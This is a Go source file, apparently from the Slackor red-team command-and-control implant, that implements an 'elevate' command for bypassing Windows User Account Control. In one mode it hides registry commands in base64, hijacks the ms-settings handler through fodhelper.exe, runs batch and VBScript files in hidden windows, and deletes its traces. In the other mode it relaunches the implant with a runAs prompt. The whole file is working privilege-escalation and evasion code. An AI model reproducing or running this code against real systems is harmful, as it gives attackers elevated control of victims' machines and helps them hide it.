// +build windows

package windows

import (
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Elevate bypasses UAC
type Elevate struct{}

// Name is the name of the command
func (e Elevate) Name() string {
	return "elevate"
}

// Run bypasses UAC
func (e Elevate) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("elevate takes 1 argument")
	}
	mode := args[0]

	switch mode {
	//Bypasses UAC using fodhelper.exe technique.
	case "fodhelper":
		//REG ADD HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command /V DelegateExecute /t REG_SZ /F
		var DelegateExecute string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXENsYXNzZXNcbXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIC9WIERlbGVnYXRlRXhlY3V0ZSAvdCBSRUdfU1ogL0Y="
		DecodedDelegateExecute, _ := base64.StdEncoding.DecodeString(DelegateExecute)
		//REG ADD HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command  /t REG_SZ /F  /D "wscript %APPDATA%\build.vbs"
		var wscriptkey string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXENsYXNzZXNcbXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kICAvdCBSRUdfU1ogL0YgIC9EICJ3c2NyaXB0ICVBUFBEQVRBJVxidWlsZC52YnMi"
		Decodedwscript, _ := base64.StdEncoding.DecodeString(wscriptkey)
		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + "\", 0, False"
		//Creates a bat file
		UAC, err := os.Create("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
		UAC.WriteString("mkdir %APPDATA%\\Windows" + "\r\n")
		UAC.WriteString(string(DecodedDelegateExecute) + "\r\n")
		UAC.WriteString(string(Decodedwscript) + "\r\n")
		UAC.WriteString("echo " + wscript + " > %APPDATA%\\build.vbs \r\n")
		UAC.WriteString("timeout 2 \r\n")
		UAC.WriteString("C:\\Windows\\System32\\fodhelper.exe \r\n")
		UAC.WriteString("REG DELETE HKCU\\SOFTWARE\\Classes\\ms-settings\\ /f \r\n")
		UAC.WriteString("timeout 2 \r\n")
		UAC.WriteString("del %APPDATA%\\build.vbs \r\n")
		UAC.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = Exec.Run()
		if err != nil {
			return "", err
		}
		err = os.Remove("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
	case "ask":
		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + "\", 0, False"
		UAC, err := os.Create("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
		UAC.WriteString("echo " + wscript + " > C:\\Users\\Public\\build.vbs \r\n")
		UAC.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = Exec.Run()
		if err != nil {
			return "", err
		}
		cmdName := "powershell.exe"
		cmdE := exec.Command(cmdName)
		cmdEArgs := []string{"Start-Process", "'cmd'", "'/c", "wscript C:\\Users\\Public\\build.vbs", "' -Verb runAs"}
		fmt.Println(cmdEArgs)
		cmdE = exec.Command(cmdName, cmdEArgs...)
		cmdE.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmdE.Run()
		if err != nil {
			return "", err
		}
		time.Sleep(5 * time.Second)
		err = os.Remove("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
		err = os.Remove("C:\\Users\\Public\\build.vbs")
		if err != nil {
			return "", err
		}
	}
	return "UAC bypass attempted.", nil
}

func init() {
	command.RegisterCommand(Elevate{})
}
